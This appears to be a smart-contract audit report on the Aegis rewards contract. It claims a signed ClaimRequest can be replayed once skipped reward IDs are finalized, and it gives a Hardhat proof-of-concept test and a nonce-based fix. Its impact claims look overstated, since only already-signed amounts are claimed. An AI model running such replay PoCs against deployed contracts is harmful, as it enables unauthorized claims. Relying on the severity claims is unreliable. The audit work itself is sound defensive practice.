# Signed `ClaimRequest` can be replayed after partial fulfillment due to delayed reward finalization


### Summary  
A valid `ClaimRequest` signature that includes multiple reward IDs can be **reused** if **some rewards were not finalized** during the initial claim. Once those rewards become finalized, the same signature can be **replayed** to extract additional rewards.  
This happens because the contract tracks claims **per reward ID**, but does **not bind each signature to a one-time use** via a nonce or message hash.


### Vulnerability Detail  

The claim process currently verifies:
- That `msg.sender == claimer` ✅
- That each reward ID was not claimed before ✅
- That each reward is finalized and non-expired ✅

However, it does **not track** whether the entire signed `ClaimRequest` was already used.

As a result:
1. A user can submit a valid claim signature for rewards `[ID1, ID2]`.
2. If `ID2` is not finalized, the contract will skip it.
3. Later, once `ID2` becomes finalized, the user can **resubmit the same signature**.
4. The contract will now **process ID2**, even though the signature was already used.

This is demonstrated in the following working PoC test:
```ts
// 1. Claim signature for [ID1 (finalized), ID2 (not yet)]
// 2. First call: ID1 claimed, ID2 skipped
// 3. Finalize ID2
// 4. Replay same signature → ID2 claimed now (unexpected)
```


### Impact  
- **One-time-use signatures can be reused**, violating cryptographic intent.
- **Delayed reward finalization enables griefing**, where users exploit skipped items later.
- **Off-chain systems lose synchronization**: same signature seems valid twice.


### Code Snippet  
Tracked claims:
[Link:](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisRewards.sol#L57)
```solidity
mapping(address => mapping(bytes32 => bool)) private _addressClaimedRewards;
```
But no replay tracking for:
```solidity
hashClaimRequest(...) // not stored or checked
```


### PoC
test code
```ts
it('should allow replay of the same claimRequest if one ID was skipped initially (griefing PoC)', async () => {
  const [owner] = await ethers.getSigners();
  const {
    aegisMintingContract,
    aegisMintingAddress,
    aegisRewardsContract,
    aegisRewardsAddress,
    assetContract,
    assetAddress,
    yusdContract,
  } = await loadFixture(deployFixture);

  await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner);
  await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner);
  await aegisRewardsContract.grantRole(REWARDS_MANAGER_ROLE, owner);
  await aegisMintingContract.setInsuranceFundAddress(ethers.ZeroAddress);

  // 1. Deposit for ID1 (finalized now)
  const snapshot1 = 'griefing-finalized';
  const snapshotId1 = ethers.encodeBytes32String(snapshot1);
  const amount1 = ethers.parseEther('1');
  {
    await assetContract.mint(aegisMintingAddress, amount1);
    const order = {
      orderType: OrderType.DEPOSIT_INCOME,
      userWallet: owner.address,
      beneficiary: ethers.ZeroAddress,
      collateralAsset: assetAddress,
      collateralAmount: amount1,
      yusdAmount: amount1,
      slippageAdjustedAmount: 0,
      expiry: (await time.latest()) + 10000,
      nonce: Date.now(),
      additionalData: encodeString(snapshot1),
    };
    const signature = await signOrder(order, aegisMintingAddress);
    await aegisMintingContract.depositIncome(order, signature);
    await aegisRewardsContract.finalizeRewards(snapshotId1, 0);
  }

  // 2. Deposit for ID2 (not finalized yet)
  const snapshot2 = 'griefing-delayed';
  const snapshotId2 = ethers.encodeBytes32String(snapshot2);
  const amount2 = ethers.parseEther('1');
  {
    await assetContract.mint(aegisMintingAddress, amount2);
    const order = {
      orderType: OrderType.DEPOSIT_INCOME,
      userWallet: owner.address,
      beneficiary: ethers.ZeroAddress,
      collateralAsset: assetAddress,
      collateralAmount: amount2,
      yusdAmount: amount2,
      slippageAdjustedAmount: 0,
      expiry: (await time.latest()) + 10000,
      nonce: Date.now() + 1,
      additionalData: encodeString(snapshot2),
    };
    const signature = await signOrder(order, aegisMintingAddress);
    await aegisMintingContract.depositIncome(order, signature);
    // intentionally not finalized yet
  }

  // 3. Create a claimRequest with both IDs
  const claimRequest = {
    claimer: owner.address,
    ids: [snapshotId1, snapshotId2],
    amounts: [amount1, amount2],
  };
  const signature = await signClaimRequest(claimRequest, aegisRewardsAddress);

  // 4. First claim: only ID1 will be processed
  await expect(aegisRewardsContract.claimRewards(claimRequest, signature)).to.emit(
    aegisRewardsContract,
    'ClaimRewards'
  ).withArgs(owner.address, [snapshotId1], amount1);

  // 5. Finalize ID2
  await aegisRewardsContract.finalizeRewards(snapshotId2, 0);

  // 6. Replay same claimRequest and signature again → Now ID2 will be processed
  await expect(aegisRewardsContract.claimRewards(claimRequest, signature)).to.emit(
    aegisRewardsContract,
    'ClaimRewards'
  ).withArgs(owner.address, [snapshotId2], amount2);
});
```


### Tool Used  
Manual Review

### Recommendation  

Add a nonce to the `ClaimRequest` struct:
[Link:](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/lib/ClaimRewardsLib.sol#L8-L12)
```solidity
struct ClaimRequest {
    address claimer;
    uint256 nonce; // one-time use
    bytes32[] ids;
    uint256[] amounts;
}
```

Track used nonces:
```solidity
mapping(address => mapping(uint256 => bool)) private _usedClaimNonces;
```

Verify:
```solidity
if (_usedClaimNonces[msg.sender][claimRequest.nonce]) revert InvalidNonce();
_usedClaimNonces[msg.sender][claimRequest.nonce] = true;
```

This guarantees that **each signed message is used only once**, regardless of how many reward IDs are claimed at a time.
